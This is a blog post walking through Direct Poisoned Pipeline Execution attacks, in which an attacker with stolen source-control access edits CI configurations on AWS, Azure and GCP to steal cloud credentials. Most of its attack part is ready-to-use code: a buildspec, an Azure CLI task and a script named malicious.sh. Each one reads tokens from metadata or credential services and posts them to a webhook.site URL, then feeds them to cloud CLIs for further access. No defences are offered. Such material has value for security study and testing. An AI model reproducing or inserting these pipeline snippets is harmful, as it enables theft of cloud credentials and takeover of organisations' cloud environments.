---
title: "Credential Theft via Direct Poisoned Pipeline Execution (Direct-PPE) Attacks on AWS, Azure, and GCP"
date: 2025-09-26T20:45:04+00:00
tags: ["Azure","AWS","GCP","DevOps","DevSecOps","pipeline","Poisoned Pipeline Execution","Direct-PPE"]
description: "In this short blog post, I’ll show how an attacker with existing access to a source code management (SCM) system can abuse malicious pipeline configurations to steal cloud tokens and escalate access across AWS, Azure, or GCP environments."
cover:
    image: ""
    alt: "Direct-PPE"
    relative: false
    hidden: false
    responsiveImages: true
---
# Credential Theft via Direct Poisoned Pipeline Execution (Direct-PPE) Attacks on AWS, Azure, and GCP
In this short blog post, I’ll show how an attacker with existing access to a source code management (SCM) system can abuse malicious pipeline configurations to steal cloud tokens and escalate access across AWS, Azure, or GCP environments.

## Direct-PPE
First, let’s clarify what Direct Poisoned Pipeline Execution (Direct-PPE) means and outline the breach scenario we’ll use to demonstrate how attackers can leverage it to further compromise cloud environments like AWS, Azure, and GCP.

Poisoned Pipeline Execution (PPE) risks refer to the ability of an attacker with access to source control systems - and without access to the build environment, to manipulate the build process by injecting malicious code/commands into the build pipeline configuration, essentially ‘poisoning’ the pipeline and running malicious code as part of the build process.

We have three types of PPE
- Direct PPE (D-PPE) : This occurs when an attacker gains direct access to the pipeline configuration. For example, they might obtain a personal access token (PAT), valid user credentials, or even a session cookie for the SCM platform, giving them the ability to modify and execute malicious changes in the pipeline configuration.
- Indirect PPE (I-PPE): This means the attacker doesn’t have direct access to the pipeline configuration files but can still compromise the pipeline by injecting malicious code into files referenced by the configuration. Examples include Makefiles, test code, scripts, or automation tools that the pipeline relies on during execution.
- Public-PPE (3PE): This is often the most dangerous scenario. If the CI pipeline of a public repository automatically runs unreviewed code submitted by anonymous contributors, it becomes vulnerable to a Public PPE (3PE) attack. This can lead to exposure of internal assets—such as secrets from private projects—especially when the public repository’s pipeline shares the same CI instance or infrastructure as private repositories.

In the next section, we’ll assume the breach has already occurred, the attacker has access to the SCM, access by having an authentication method to the organization’s source code management. It may be a personal access token (PAT), an SSH key, or any other allowed authentication credential. An example of a method an attacker can use to achieve this technique is using a phishing attack against an organization. We’ll explore how they can escalate privileges further to gain access to cloud environments.

## AWS
![image](/img/aws_killchain.png)

Because we have access to the code repository, we can use the Direct PPE attack vector to enumerate the permissions under which the pipeline is running. This can be done by querying the Instance Metadata Service (IMDS) available in the cloud environment.
In the example pipeline, I’m using webhook.site to exfiltrate captured data.

```yaml
version: 0.2

phases:
  pre_build:
    commands:
      - curl 'https://webhook.site/1ec8cf1f-cfb6-4c43-a743-7368135c8bca' -sH 'content-type:application/json' --data "$(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
```
You can manually retrieve the temporary role credentials from inside a container by appending the environment variable to the IP address of the Amazon ECS container agent and running the curl command on the resulting string.
```
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```
This token and the role credentials are added to the agent's internal cache. The agent populates the environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI in the container with the URI of the credential ID (for example, /v2/credentials/12345678-90ab-cdef-1234-567890abcdef).

![image](/img/aws_webhook.png)

The exfiltrated token can then be stored in environment variables and used with the AWS CLI to interact with the compromised cloud environment.

![image](/img/awscli1.png)

After gaining initial access, you can begin enumerating the AWS environment to identify pivot points and locate weak spots that can be exploited for further privilege escalation or lateral movement.

![image](/img/awscli2.png)

![image](/img/awscli3.png)


## Azure
![image](/img/azure_killchain.png)

We can easily exfiltrate the Azure DevOps agent access token, enumerate Azure DevOps projects, and search for additional secrets or clues to further escalate our privileges.
If the pipeline configuration contains a service connection, as shown in the upcoming example, we can directly exfiltrate that service connection and pivot into Azure environments in a straightforward way.

```yaml
- task: AzureCLI@2
  inputs:
    azureSubscription: $(azureSubscription)
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      # Export Azure access token
      ACCESS_TOKEN=$(az account get-access-token --query accessToken -o tsv)
      SUB_ID=$(az account show --query id -o tsv)
      curl 'https://webhook.site/1ec8cf1f-cfb6-4c43-a743-7368135c8bca' -sH 'content-type: text/plain' --data "ACCESS_TOKEN=$ACCESS_TOKEN SUB_ID=$SUB_ID"
```

![image](/img/azure_webhook.png)

Decode the JWT using JWT.io and under decoded payload section, note the value of field titled tid which will be the Account Id/Tenant ID.
- Tenant ID will also appear in other values as well.
- Additionally, subscription ID, resource group , and resource name will be present too.

![image](/img/azurecli.png)

Install Azure PowerShell module with the below command
```
Install-Module -Name Az -Repository PSGallery -Force
```

Run below PowerShell commands to authenticate with the
Azure Cloud using the exfiltrated Identity Token and the
Account ID (from decoding the JWT)

![image](/img/azurecli.png)

We have successfully established a connection to Azure, allowing us to continue with the post-exploitation process and expand our access within the environment!

## GCP
![image](/img/gcp_attackchain.png)

Just like AWS and Azure, GCP also provides a metadata service. We can leverage it in the same way to retrieve and exfiltrate access tokens for further use in the attack chain.

Create a Shell script file named malicious.sh in the root
directory of the source code. Using this file we’ll exfiltrate the
default service account token to the webhook dashboard.
```bash
#!/bin/sh
apt update && apt install curl -y
token=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google")
echo $token > token.txt
curl -X POST 'https://webhook.site/1ec8cf1f-cfb6-4c43-a743-7368135c8bca' -sH 'content-type:application/json' --data '@token.txt'
```
Create a new build stage in cloudbuild.yaml file with the below
configurations.
```
- name: 'ubuntu'
args: ['bash', './malicious.sh']
```
![image](/img/gcp_webhook.png)

Use below command to inspect the details of an OAuth 2.0
access token issued by Google's IAM services.
```
curl https://oauth2.googleapis.com/tokeninfo?access_token=<EXFILTRATED_TOKEN>
```
![image](/img/gcpcli1.png)

Then we can enumerate the GCP project metadata with the
below command. It will give us the Project ID & other information.

![image](/img/gcpcli2.png)

We have successfully established a connection to GCP, allowing us to continue with the post-exploitation process and expand our access within the environment!

# Summary
This post explains how attackers can abuse Direct Poisoned Pipeline Execution (Direct-PPE) to steal credentials and escalate privileges in AWS, Azure, and GCP environments. Direct-PPE occurs when an attacker gains access to a source code management (SCM) system (e.g., via stolen credentials or a PAT) and modifies the pipeline configuration to run malicious commands.
Overall, the post highlights how attackers can pivot from SCM access to full cloud environment compromise using poisoned pipeline techniques.





